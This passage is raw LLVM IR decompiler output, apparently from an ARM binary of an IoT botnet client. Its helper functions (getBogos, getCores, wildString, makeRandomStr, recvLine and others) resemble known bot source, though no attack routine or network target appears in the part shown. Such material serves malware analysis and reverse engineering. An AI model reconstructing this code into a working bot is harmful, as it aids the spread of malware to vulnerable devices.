dec_label_pc_9148:                                ; preds = %dec_label_pc_9118
  %v1_914c = call i32 @__GI_close(i32 %arg1)
  %v2_9150 = ptrtoint i32* %stack_var_-36 to i32
  %v2_9158 = call i32 @sigemptyset(i32* nonnull %stack_var_-36)
  store i32 %v2_9150, i32* @r0, align 4
  %v2_9168 = call i32 @__GI_sigaddset(i32 %v2_9150, i32 2)
  store i32 %v2_9150, i32* @r0, align 4
  %v2_9178 = call i32 @__GI_sigaddset(i32 %v2_9150, i32 3)
  store i32 %v2_9150, i32* @r0, align 4
  %v2_9188 = call i32 @__GI_sigaddset(i32 %v2_9150, i32 1)
  %v2_9190 = ptrtoint i32* %stack_var_-28 to i32
  %v4_919c = call i32 @__GI_sigprocmask(i32 0, i32 %v2_9150, i32 %v2_9190, i32 %v2_9150)
  %v2_91bc = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_91a0

dec_label_pc_91a0:                                ; preds = %dec_label_pc_91e4, %dec_label_pc_9148
  %v2_91b0 = load i32, i32* @global_var_30604.32, align 4
  %v2_91b4 = add i32 %v2_91b0, %v3_911c
  %v1_91b8 = inttoptr i32 %v2_91b4 to i32*
  %v2_91b8 = load i32, i32* %v1_91b8, align 4
  store i32 %v2_91b8, i32* @r0, align 4
  store i32 %v2_91bc, i32* @r1, align 4
  %v3_91cc = call i32 @__libc_waitpid(i32 %v2_91b8, i32 %v2_91bc, i32 0)
  %v3_91dc = icmp eq i32 %v3_91cc, -1
  %v8_91dc = icmp eq i32 %v3_91cc, -1
  br i1 %v3_91dc, label %dec_label_pc_91e4, label %dec_label_pc_91f8

dec_label_pc_91e4:                                ; preds = %dec_label_pc_91a0
  %v0_91e4 = call i32 @__GI___errno_location()
  %v1_91ec = inttoptr i32 %v0_91e4 to i32*
  %v2_91ec = load i32, i32* %v1_91ec, align 4
  %v7_91f0 = icmp eq i32 %v2_91ec, 4
  br i1 %v7_91f0, label %dec_label_pc_91a0, label %dec_label_pc_91f8

dec_label_pc_91f8:                                ; preds = %dec_label_pc_91a0, %dec_label_pc_91e4
  %v4_9208 = call i32 @__GI_sigprocmask(i32 2, i32 %v2_9190, i32 0, i32 %v2_9190)
  %v3_9210 = mul i32 %tmp6, 4
  %v2_921c = load i32, i32* @global_var_30604.32, align 4
  %v2_9220 = add i32 %v2_921c, %v3_9210
  %v2_9228 = inttoptr i32 %v2_9220 to i32*
  store i32 0, i32* %v2_9228, align 4
  br i1 %v8_91dc, label %dec_label_pc_9264, label %dec_label_pc_9238

dec_label_pc_9238:                                ; preds = %dec_label_pc_91f8
  %v3_9238 = load i32, i32* %stack_var_-40, align 4
  %v1_9244 = and i32 %v3_9238, 65280
  %v3_92481 = udiv i32 %v1_9244, 256
  br label %dec_label_pc_9264

dec_label_pc_9264:                                ; preds = %dec_label_pc_9238, %dec_label_pc_91f8, %entry, %dec_label_pc_9118
  %storemerge = phi i32 [ -1, %dec_label_pc_9118 ], [ -1, %entry ], [ %v3_92481, %dec_label_pc_9238 ], [ -1, %dec_label_pc_91f8 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_91bc, { 1, 0 }
  uselistorder i32 %v2_9190, { 1, 0, 2 }
  uselistorder i32 %v2_9150, { 0, 1, 3, 2, 5, 4, 7, 6 }
  uselistorder i32 %v3_911c, { 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_sigaddset, { 2, 1, 0 }
  uselistorder i32* @global_var_30604.32, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_9264, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_91f8, { 1, 0 }
}

define i32 @fdgets(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  br label %dec_label_pc_92ec

dec_label_pc_92ac:                                ; preds = %dec_label_pc_92fc
  %v1_92c8 = call i32 @__GI_read(i32 %arg3)
  %v1_92d8 = add nuw i32 %storemerge25, 1
  %v7_92e4 = icmp eq i32 %v1_92c8, 1
  br i1 %v7_92e4, label %dec_label_pc_92ec, label %dec_label_pc_931c

dec_label_pc_92ec:                                ; preds = %entry, %dec_label_pc_92ac
  %storemerge25 = phi i32 [ 0, %entry ], [ %v1_92d8, %dec_label_pc_92ac ]
  %v6_92f8 = icmp slt i32 %storemerge25, %arg2
  br i1 %v6_92f8, label %dec_label_pc_92fc, label %dec_label_pc_931c

dec_label_pc_92fc:                                ; preds = %dec_label_pc_92ec
  %v2_9308 = add i32 %storemerge25, %arg1
  %v1_930c = add i32 %v2_9308, -1
  %v1_9310 = inttoptr i32 %v1_930c to i8*
  %v2_9310 = load i8, i8* %v1_9310, align 1
  %v7_9314 = icmp eq i8 %v2_9310, 10
  br i1 %v7_9314, label %dec_label_pc_931c, label %dec_label_pc_92ac

dec_label_pc_931c:                                ; preds = %dec_label_pc_92fc, %dec_label_pc_92ec, %dec_label_pc_92ac
  %stack_var_-24.0.lcssa = phi i32 [ 1, %dec_label_pc_92fc ], [ 1, %dec_label_pc_92ec ], [ %v1_92c8, %dec_label_pc_92ac ]
  %v2_9320 = icmp eq i32 %stack_var_-24.0.lcssa, 0
  %storemerge3 = select i1 %v2_9320, i32 0, i32 %arg1
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i32 %v1_92c8, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_92ec, { 1, 0 }
}

define i32 @parseHex(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_93a43 = load i8, i8* %arg1, align 1
  %v2_93a85 = icmp eq i8 %v2_93a43, 0
  br i1 %v2_93a85, label %dec_label_pc_93bc, label %dec_label_pc_93b0

dec_label_pc_9370:                                ; preds = %dec_label_pc_93b0
  %v3_9374 = mul i32 %stack_var_-20.07, 16
  %v2_937c = load i8, i8* %stack_var_-28.06, align 1
  %v3_937c = zext i8 %v2_937c to i32
  %v4_9388 = mul nuw nsw i32 %v3_937c, 4
  %v5_9388 = add i32 %v4_9388, ptrtoint (i32* @global_var_1f988.41 to i32)
  %v6_9388 = inttoptr i32 %v5_9388 to i32*
  %v7_9388 = load i32, i32* %v6_9388, align 4
  %v2_938c = or i32 %v7_9388, %v3_9374
  %v1_9398 = add i32 %v4_93a08, 1
  %v5_939c = inttoptr i32 %v1_9398 to i8*
  %v2_93a4 = load i8, i8* %v5_939c, align 1
  %v2_93a8 = icmp eq i8 %v2_93a4, 0
  br i1 %v2_93a8, label %dec_label_pc_93bc, label %dec_label_pc_93b0

dec_label_pc_93b0:                                ; preds = %entry, %dec_label_pc_9370
  %v4_93a08 = phi i32 [ %v1_9398, %dec_label_pc_9370 ], [ %tmp, %entry ]
  %stack_var_-20.07 = phi i32 [ %v2_938c, %dec_label_pc_9370 ], [ 0, %entry ]
  %stack_var_-28.06 = phi i8* [ %v5_939c, %dec_label_pc_9370 ], [ %arg1, %entry ]
  %v1_93b4 = icmp slt i32 %stack_var_-20.07, 0
  br i1 %v1_93b4, label %dec_label_pc_93bc, label %dec_label_pc_9370

dec_label_pc_93bc:                                ; preds = %dec_label_pc_9370, %dec_label_pc_93b0, %entry
  %stack_var_-20.0.lcssa = phi i32 [ 0, %entry ], [ %v2_938c, %dec_label_pc_9370 ], [ %stack_var_-20.07, %dec_label_pc_93b0 ]
  ret i32 %stack_var_-20.0.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-20.07, { 1, 2, 0 }
  uselistorder label %dec_label_pc_93bc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_93b0, { 1, 0 }
}

define i32 @wildString(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp8 = ptrtoint i8* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v3_93d8 = load i32, i32* @r4, align 4
  %v6_93d8 = load i32, i32* @fp, align 4
  store i32 37856, i32* %stack_var_-4, align 4
  %v2_93dc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_93dc, i32* @fp, align 4
  %v2_93f0 = load i8, i8* %arg1, align 1
  %v7_93fc = icmp eq i8 %v2_93f0, 42
  br i1 %v7_93fc, label %dec_label_pc_9430, label %dec_label_pc_9404

dec_label_pc_9404:                                ; preds = %entry
  %v7_9408 = icmp eq i8 %v2_93f0, 63
  br i1 %v7_9408, label %dec_label_pc_94a0, label %dec_label_pc_9410

dec_label_pc_9410:                                ; preds = %dec_label_pc_9404
  %v2_9414 = icmp eq i8 %v2_93f0, 0
  br i1 %v2_9414, label %dec_label_pc_9420, label %dec_label_pc_94f8

dec_label_pc_9420:                                ; preds = %dec_label_pc_9410
  %v2_9424 = load i8, i8* %tmp, align 1
  %v3_9424 = zext i8 %v2_9424 to i32
  br label %dec_label_pc_956c

dec_label_pc_9430:                                ; preds = %entry
  %v1_9434 = add i32 %tmp8, 1
  %v3_9440 = inttoptr i32 %v1_9434 to i8*
  %v4_9440 = call i32 @wildString(i8* %v3_9440, i32 %arg2)
  %v2_9448 = icmp eq i32 %v4_9440, 0
  br i1 %v2_9448, label %dec_label_pc_948c, label %dec_label_pc_9450

dec_label_pc_9450:                                ; preds = %dec_label_pc_9430
  %v2_9454 = load i8, i8* %tmp, align 1
  %v2_9458 = icmp eq i8 %v2_9454, 0
  br i1 %v2_9458, label %dec_label_pc_9494, label %dec_label_pc_9460

dec_label_pc_9460:                                ; preds = %dec_label_pc_9450
  %v1_9464 = add i32 %arg2, 1
  %v4_9470 = call i32 @wildString(i8* nonnull %arg1, i32 %v1_9464)
  %v2_9478 = icmp eq i32 %v4_9470, 0
  br i1 %v2_9478, label %dec_label_pc_948c, label %dec_label_pc_9494

dec_label_pc_948c:                                ; preds = %dec_label_pc_9460, %dec_label_pc_9430
  br label %dec_label_pc_9494

dec_label_pc_9494:                                ; preds = %dec_label_pc_9450, %dec_label_pc_9460, %dec_label_pc_948c
  %storemerge3 = phi i32 [ 0, %dec_label_pc_948c ], [ 1, %dec_label_pc_9460 ], [ 1, %dec_label_pc_9450 ]
  br label %dec_label_pc_956c

dec_label_pc_94a0:                                ; preds = %dec_label_pc_9404
  %v2_94a4 = load i8, i8* %tmp, align 1
  %v2_94a8 = icmp eq i8 %v2_94a4, 0
  br i1 %v2_94a8, label %dec_label_pc_94ec, label %dec_label_pc_94b0

dec_label_pc_94b0:                                ; preds = %dec_label_pc_94a0
  %v1_94b4 = add i32 %tmp8, 1
  %v1_94bc = add i32 %arg2, 1
  %v2_94c8 = inttoptr i32 %v1_94b4 to i8*
  %v3_94c8 = call i32 @wildString(i8* %v2_94c8, i32 %v1_94bc)
  %v2_94d0 = icmp ne i32 %v3_94c8, 0
  %. = zext i1 %v2_94d0 to i32
  br label %dec_label_pc_94ec

dec_label_pc_94ec:                                ; preds = %dec_label_pc_94b0, %dec_label_pc_94a0
  %storemerge2 = phi i32 [ 1, %dec_label_pc_94a0 ], [ %., %dec_label_pc_94b0 ]
  br label %dec_label_pc_956c

dec_label_pc_94f8:                                ; preds = %dec_label_pc_9410
  %v2_94fc = load i8, i8* %arg1, align 1
  %v3_94fc = zext i8 %v2_94fc to i32
  %v1_9504 = call i32 @__GI_toupper(i32 %v3_94fc)
  store i32 %v1_9504, i32* @r4, align 4
  %v2_9510 = load i8, i8* %tmp, align 1
  %v3_9510 = zext i8 %v2_9510 to i32
  %v1_9518 = call i32 @__GI_toupper(i32 %v3_9510)
  %v0_9520 = load i32, i32* @r4, align 4
  %v9_9520 = icmp eq i32 %v0_9520, %v1_9518
  br i1 %v9_9520, label %dec_label_pc_9528, label %dec_label_pc_9564

dec_label_pc_9528:                                ; preds = %dec_label_pc_94f8
  %v1_952c = add i32 %tmp8, 1
  %v1_9534 = add i32 %arg2, 1
  %v2_9540 = inttoptr i32 %v1_952c to i8*
  %v3_9540 = call i32 @wildString(i8* %v2_9540, i32 %v1_9534)
  %v2_9548 = icmp ne i32 %v3_9540, 0
  %.7 = zext i1 %v2_9548 to i32
  br label %dec_label_pc_9564

dec_label_pc_9564:                                ; preds = %dec_label_pc_9528, %dec_label_pc_94f8
  %storemerge = phi i32 [ 1, %dec_label_pc_94f8 ], [ %.7, %dec_label_pc_9528 ]
  br label %dec_label_pc_956c

dec_label_pc_956c:                                ; preds = %dec_label_pc_94ec, %dec_label_pc_9494, %dec_label_pc_9420, %dec_label_pc_9564
  %stack_var_-48.0 = phi i32 [ %storemerge3, %dec_label_pc_9494 ], [ %storemerge2, %dec_label_pc_94ec ], [ %v3_9424, %dec_label_pc_9420 ], [ %storemerge, %dec_label_pc_9564 ]
  store i32 %v3_93d8, i32* @r4, align 4
  store i32 %v6_93d8, i32* @fp, align 4
  ret i32 %stack_var_-48.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8* %tmp, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 3, 2, 0, 1, 4 }
  uselistorder label %dec_label_pc_956c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_9494, { 2, 1, 0 }
}

define i32 @getHost(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_95a0 = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_95a0, i32* %arg2, align 4
  %v3_95b8 = icmp eq i32 %v1_95a0, -1
  %. = zext i1 %v3_95b8 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @uppercase(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_95f8 = load i32, i32* %r0.global-to-local, align 4
  %storemerge2 = inttoptr i32 %v0_95f8 to i8*
  %v2_96303 = load i8, i8* %storemerge2, align 1
  %v2_96345 = icmp eq i8 %v2_96303, 0
  br i1 %v2_96345, label %dec_label_pc_963c, label %dec_label_pc_9600

dec_label_pc_9600:                                ; preds = %entry, %dec_label_pc_9600
  %storemerge7 = phi i8* [ %storemerge, %dec_label_pc_9600 ], [ %storemerge2, %entry ]
  %storemerge.in6 = phi i32 [ %v1_9624, %dec_label_pc_9600 ], [ %v0_95f8, %entry ]
  %v2_9604 = load i8, i8* %storemerge7, align 1
  %v3_9604 = zext i8 %v2_9604 to i32
  store i32 %v3_9604, i32* %r0.global-to-local, align 4
  %v1_960c = call i32 @__GI_toupper(i32 %v3_9604)
  store i32 %v1_960c, i32* %r0.global-to-local, align 4
  %v1_961c = trunc i32 %v1_960c to i8
  store i8 %v1_961c, i8* %storemerge7, align 1
  %v1_9624 = add i32 %storemerge.in6, 1
  %storemerge = inttoptr i32 %v1_9624 to i8*
  %v2_9630 = load i8, i8* %storemerge, align 1
  %v2_9634 = icmp eq i8 %v2_9630, 0
  br i1 %v2_9634, label %dec_label_pc_962c.dec_label_pc_963c_crit_edge, label %dec_label_pc_9600

dec_label_pc_962c.dec_label_pc_963c_crit_edge:    ; preds = %dec_label_pc_9600
  %v1_9644.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_963c

dec_label_pc_963c:                                ; preds = %dec_label_pc_962c.dec_label_pc_963c_crit_edge, %entry
  %v1_9644 = phi i32 [ %v1_9644.pre, %dec_label_pc_962c.dec_label_pc_963c_crit_edge ], [ %v0_95f8, %entry ]
  ret i32 %v1_9644

; uselistorder directives
  uselistorder i8* %storemerge, { 1, 0 }
  uselistorder i32 %v1_9624, { 1, 0 }
  uselistorder i8* %storemerge7, { 1, 0 }
  uselistorder i32 %v0_95f8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 2, 0, 1 }
  uselistorder label %dec_label_pc_9600, { 1, 0 }
}

define i32 @getBogos(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4128 = alloca i32, align 4
  %stack_var_-4120 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  store i32 -4108, i32* @r3, align 4
  %v2_9664 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_9664, i32* @r2, align 4
  %v3_9674 = call i32 @__GI_open(i32 ptrtoint ([14 x i8]* @global_var_1fd88.43 to i32), i32 0)
  %v2_982c = ptrtoint i32* %stack_var_-4128 to i32
  %v1_9694 = bitcast i32* %stack_var_-4128 to i8*
  br label %dec_label_pc_9824

dec_label_pc_9684:                                ; preds = %dec_label_pc_9824
  %v2_9694 = call i32 @uppercase(i8* %v1_9694)
  %v4_96ac = call i32 @strstr(i32 %v2_982c, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1fd98.45, i32 0, i32 0))
  %v9_96c4 = icmp eq i32 %v4_96ac, %v2_982c
  br i1 %v9_96c4, label %dec_label_pc_96cc, label %dec_label_pc_9808

dec_label_pc_96cc:                                ; preds = %dec_label_pc_9684
  %tmp21 = bitcast i32* %stack_var_-4120 to i8*
  br label %dec_label_pc_96f0

dec_label_pc_96e4:                                ; preds = %dec_label_pc_9710, %dec_label_pc_9700, %dec_label_pc_96f0
  %v1_96e8 = add i32 %v4_96f0, 1
  %v5_96ec = inttoptr i32 %v1_96e8 to i8*
  br label %dec_label_pc_96f0

dec_label_pc_96f0:                                ; preds = %dec_label_pc_96cc, %dec_label_pc_96e4
  %storemerge2 = phi i8* [ %v5_96ec, %dec_label_pc_96e4 ], [ %tmp21, %dec_label_pc_96cc ]
  %v4_96f0 = ptrtoint i8* %storemerge2 to i32
  %v2_96f4 = load i8, i8* %storemerge2, align 1
  %v7_96f8 = icmp eq i8 %v2_96f4, 32
  br i1 %v7_96f8, label %dec_label_pc_96e4, label %dec_label_pc_9700

dec_label_pc_9700:                                ; preds = %dec_label_pc_96f0
  %v2_9704 = load i8, i8* %storemerge2, align 1
  %v7_9708 = icmp eq i8 %v2_9704, 9
  br i1 %v7_9708, label %dec_label_pc_96e4, label %dec_label_pc_9710

dec_label_pc_9710:                                ; preds = %dec_label_pc_9700
  %v2_9714 = load i8, i8* %storemerge2, align 1
  %v7_9718 = icmp eq i8 %v2_9714, 58
  br i1 %v7_9718, label %dec_label_pc_96e4, label %dec_label_pc_9748.preheader

dec_label_pc_9748.preheader:                      ; preds = %dec_label_pc_9710
  %v1_974c = add i32 %v4_96f0, -1
  br label %dec_label_pc_9748

dec_label_pc_9724:                                ; preds = %dec_label_pc_9770, %dec_label_pc_9748
  %v3_9734 = call i32 @strlen(i8* %storemerge2)
  %v2_973c = add i32 %v1_974c, %v3_9734
  %v3_9744 = inttoptr i32 %v2_973c to i8*
  store i8 0, i8* %v3_9744, align 1
  br label %dec_label_pc_9748

dec_label_pc_9748:                                ; preds = %dec_label_pc_9748.preheader, %dec_label_pc_9724
  %v3_9758 = call i32 @strlen(i8* %storemerge2)
  %v2_9760 = add i32 %v1_974c, %v3_9758
  %v1_9764 = inttoptr i32 %v2_9760 to i8*
  %v2_9764 = load i8, i8* %v1_9764, align 1
  %v7_9768 = icmp eq i8 %v2_9764, 13
  br i1 %v7_9768, label %dec_label_pc_9724, label %dec_label_pc_9770

dec_label_pc_9770:                                ; preds = %dec_label_pc_9748
  store i32 %v1_974c, i32* @r4, align 4
  %v3_9780 = call i32 @strlen(i8* %storemerge2)
  %v0_9788 = load i32, i32* @r4, align 4
  %v2_9788 = add i32 %v0_9788, %v3_9780
  %v1_978c = inttoptr i32 %v2_9788 to i8*
  %v2_978c = load i8, i8* %v1_978c, align 1
  %v7_9790 = icmp eq i8 %v2_978c, 10
  br i1 %v7_9790, label %dec_label_pc_9724, label %dec_label_pc_9798

dec_label_pc_9798:                                ; preds = %dec_label_pc_9770
  store i32 %v4_96f0, i32* @r0, align 4
  %v2_97a4 = call i32 @__GI_strchr(i32 %v4_96f0, i32 46)
  %v2_97ac = icmp eq i32 %v2_97a4, 0
  br i1 %v2_97ac, label %dec_label_pc_97d0, label %dec_label_pc_97b4

dec_label_pc_97b4:                                ; preds = %dec_label_pc_9798
  store i32 %v4_96f0, i32* @r0, align 4
  %v2_97c0 = call i32 @__GI_strchr(i32 %v4_96f0, i32 46)
  %v3_97cc = inttoptr i32 %v2_97c0 to i8*
  store i8 0, i8* %v3_97cc, align 1
  br label %dec_label_pc_97d0

dec_label_pc_97d0:                                ; preds = %dec_label_pc_9798, %dec_label_pc_97b4
  store i32 %v4_96f0, i32* @r1, align 4
  %v2_97ec = inttoptr i32 %arg1 to i8*
  %v3_97ec = call i32 @strcpy(i8* %v2_97ec, i32 %v4_96f0)
  %v1_97f4 = call i32 @__GI_close(i32 %v3_9674)
  br label %dec_label_pc_9860

dec_label_pc_9808:                                ; preds = %dec_label_pc_9684
  store i32 4096, i32* @r2, align 4
  %v3_9820 = call i32 @__GI_memset(i8* %v1_9694, i32 0)
  br label %dec_label_pc_9824

dec_label_pc_9824:                                ; preds = %entry, %dec_label_pc_9808
  %v4_983c = call i32 @fdgets(i32 %v2_982c, i32 4096, i32 %v3_9674, i32 %v2_982c)
  %v2_9844 = icmp eq i32 %v4_983c, 0
  br i1 %v2_9844, label %dec_label_pc_984c, label %dec_label_pc_9684

dec_label_pc_984c:                                ; preds = %dec_label_pc_9824
  %v1_9850 = call i32 @__GI_close(i32 %v3_9674)
  br label %dec_label_pc_9860

dec_label_pc_9860:                                ; preds = %dec_label_pc_97d0, %dec_label_pc_984c
  %storemerge4 = phi i32 [ 1, %dec_label_pc_984c ], [ 0, %dec_label_pc_97d0 ]
  ret i32 %storemerge4

; uselistorder directives
  uselistorder i32 %v1_974c, { 2, 1, 0 }
  uselistorder i32 %v4_96f0, { 3, 2, 1, 0, 5, 4, 6, 7 }
  uselistorder i8* %storemerge2, { 0, 2, 1, 3, 4, 6, 5 }
  uselistorder i32 %v2_982c, { 0, 3, 1, 2 }
  uselistorder i32 %v3_9674, { 1, 2, 0 }
  uselistorder label %dec_label_pc_9860, { 1, 0 }
  uselistorder label %dec_label_pc_9824, { 1, 0 }
  uselistorder label %dec_label_pc_97d0, { 1, 0 }
  uselistorder label %dec_label_pc_9748, { 1, 0 }
  uselistorder label %dec_label_pc_96f0, { 1, 0 }
}

define i32 @getCores(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4120 = alloca i32, align 4
  %v2_9890 = ptrtoint i32* %stack_var_-4120 to i32
  store i32 0, i32* @r3, align 4
  %v3_98a4 = call i32 @__GI_open(i32 ptrtoint ([14 x i8]* @global_var_1fd88.43 to i32), i32 0)
  %v1_98c4 = bitcast i32* %stack_var_-4120 to i8*
  br label %dec_label_pc_9920

dec_label_pc_98b4:                                ; preds = %dec_label_pc_9920
  %v2_98c4 = call i32 @uppercase(i8* %v1_98c4)
  %v4_98dc = call i32 @strstr(i32 %v2_9890, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1fd98.45, i32 0, i32 0))
  %v9_98f0 = icmp eq i32 %v4_98dc, %v2_9890
  br i1 %v9_98f0, label %dec_label_pc_98f8, label %dec_label_pc_9904

dec_label_pc_98f8:                                ; preds = %dec_label_pc_98b4
  %v1_98fc = add i32 %stack_var_-24.1, 1
  br label %dec_label_pc_9904

dec_label_pc_9904:                                ; preds = %dec_label_pc_98b4, %dec_label_pc_98f8
  %stack_var_-24.0 = phi i32 [ %v1_98fc, %dec_label_pc_98f8 ], [ %stack_var_-24.1, %dec_label_pc_98b4 ]
  store i32 4096, i32* @r2, align 4
  %v3_991c = call i32 @__GI_memset(i8* %v1_98c4, i32 0)
  br label %dec_label_pc_9920

dec_label_pc_9920:                                ; preds = %entry, %dec_label_pc_9904
  %stack_var_-24.1 = phi i32 [ 0, %entry ], [ %stack_var_-24.0, %dec_label_pc_9904 ]
  %v4_9938 = call i32 @fdgets(i32 %v2_9890, i32 4096, i32 %v3_98a4, i32 %v2_9890)
  %v2_9940 = icmp eq i32 %v4_9938, 0
  br i1 %v2_9940, label %dec_label_pc_9948, label %dec_label_pc_98b4

dec_label_pc_9948:                                ; preds = %dec_label_pc_9920
  %v1_994c = call i32 @__GI_close(i32 %v3_98a4)
  ret i32 %stack_var_-24.1

; uselistorder directives
  uselistorder i32 %stack_var_-24.1, { 0, 2, 1 }
  uselistorder i32 %v2_9890, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_9920, { 1, 0 }
  uselistorder label %dec_label_pc_9904, { 1, 0 }
}

define i32 @makeRandomStr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_9970 = load i32, i32* @r4, align 4
  %v6_9970 = load i32, i32* @fp, align 4
  %v0_997c = load i32, i32* %r0.global-to-local, align 4
  %v5_9a1024 = icmp sgt i32 %arg2, 0
  br i1 %v5_9a1024, label %dec_label_pc_9998, label %dec_label_pc_9a14

dec_label_pc_9998:                                ; preds = %entry, %dec_label_pc_9998
  %storemerge725 = phi i32 [ %v1_99fc, %dec_label_pc_9998 ], [ 0, %entry ]
  %v2_99a4 = add i32 %storemerge725, %v0_997c
  store i32 %v2_99a4, i32* @r4, align 4
  %v0_99a8 = call i32 @rand_cmwc()
  store i32 %v0_99a8, i32* %r0.global-to-local, align 4
  %v3_99b8 = udiv i32 %v0_99a8, 26
  %tmp = mul nsw i32 %v3_99b8, -2
  %v2_99dc = add i32 %v0_99a8, %tmp
  %fold = add i32 %v2_99dc, 65
  %v1_99f4 = trunc i32 %fold to i8
  %v2_99f4 = load i32, i32* @r4, align 4
  %v3_99f4 = inttoptr i32 %v2_99f4 to i8*
  store i8 %v1_99f4, i8* %v3_99f4, align 1
  %v1_99fc = add nuw nsw i32 %storemerge725, 1
  %v5_9a10 = icmp slt i32 %v1_99fc, %arg2
  br i1 %v5_9a10, label %dec_label_pc_9998, label %dec_label_pc_9a04.dec_label_pc_9a14_crit_edge

dec_label_pc_9a04.dec_label_pc_9a14_crit_edge:    ; preds = %dec_label_pc_9998
  %v1_9a1c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9a14

dec_label_pc_9a14:                                ; preds = %dec_label_pc_9a04.dec_label_pc_9a14_crit_edge, %entry
  %v1_9a1c = phi i32 [ %v1_9a1c.pre, %dec_label_pc_9a04.dec_label_pc_9a14_crit_edge ], [ %v0_997c, %entry ]
  store i32 %v3_9970, i32* @r4, align 4
  store i32 %v6_9970, i32* @fp, align 4
  ret i32 %v1_9a1c

; uselistorder directives
  uselistorder i32 %v1_99fc, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_9998, { 1, 0 }
}

define i32 @recvLine(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_9a78.lr.ph:
  %tmp33 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-185 = alloca i8, align 1
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_9a28 = load i32, i32* @fp, align 4
  store i32 %v3_9a28, i32* %stack_var_-16, align 4
  store i32 39472, i32* %stack_var_-4, align 4
  %v2_9a2c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9a2c, i32* @fp, align 4
  store i32 %arg3, i32* @r2, align 4
  %v4_9a50 = call i32 @__GI_memset(i8* %arg2, i32 0)
  store i32 30, i32* %stack_var_-184, align 4
  %v2_9a64 = ptrtoint i32* %stack_var_-176 to i32
  br label %dec_label_pc_9a78

dec_label_pc_9a78:                                ; preds = %dec_label_pc_9a78.lr.ph, %dec_label_pc_9a78
  %storemerge527 = phi i32 [ 0, %dec_label_pc_9a78.lr.ph ], [ %v1_9a8c, %dec_label_pc_9a78 ]
  %v5_9a84 = mul nuw nsw i32 %storemerge527, 4
  %v6_9a84 = add i32 %v5_9a84, %v2_9a64
  %v7_9a84 = inttoptr i32 %v6_9a84 to i32*
  store i32 0, i32* %v7_9a84, align 4
  %v1_9a8c = add nuw nsw i32 %storemerge527, 1
  %tmp52 = icmp ult i32 %v1_9a8c, 32
  br i1 %tmp52, label %dec_label_pc_9a78, label %dec_label_pc_9aa0

dec_label_pc_9aa0:                                ; preds = %dec_label_pc_9a78
  %v13_9a28 = ptrtoint i32* %stack_var_-16 to i32
  %v3_9aa4 = udiv i32 %arg1, 32
  %v3_9ab0 = mul nuw nsw i32 %v3_9aa4, 4
  %v2_9ab8 = add nsw i32 %v3_9ab0, -160
  %v2_9abc = add i32 %v2_9ab8, %v13_9a28
  %v1_9ac0 = inttoptr i32 %v2_9abc to i32*
  %v2_9ac0 = load i32, i32* %v1_9ac0, align 4
  %v1_9ac8 = urem i32 %arg1, 32
  %v6_9ad0 = shl i32 1, %v1_9ac8
  %v2_9ad4 = or i32 %v2_9ac0, %v6_9ad0
  store i32 %v2_9ad4, i32* %v1_9ac0, align 4
  %v1_9af4 = add i32 %arg1, 1
  %v2_9b00 = ptrtoint i32* %stack_var_-184 to i32
  store i32 0, i32* @r2, align 4
  %v5_9b14 = call i32 @__libc_select(i32 %v1_9af4, i32 %v2_9a64, i32 0, i32 %v2_9a64, i32 %v2_9b00)
  %v5_9b28 = icmp sgt i32 %v5_9b14, 0
  br i1 %v5_9b28, label %dec_label_pc_9cbc.preheader, label %dec_label_pc_9c28.preheader

dec_label_pc_9c28.preheader:                      ; preds = %dec_label_pc_9aa0
  %v7_9c3023 = icmp slt i32 %tmp33, 10
  br i1 %v7_9c3023, label %dec_label_pc_9b68.lr.ph, label %dec_label_pc_9cbc.preheader

dec_label_pc_9b68.lr.ph:                          ; preds = %dec_label_pc_9c28.preheader, %dec_label_pc_9c1c
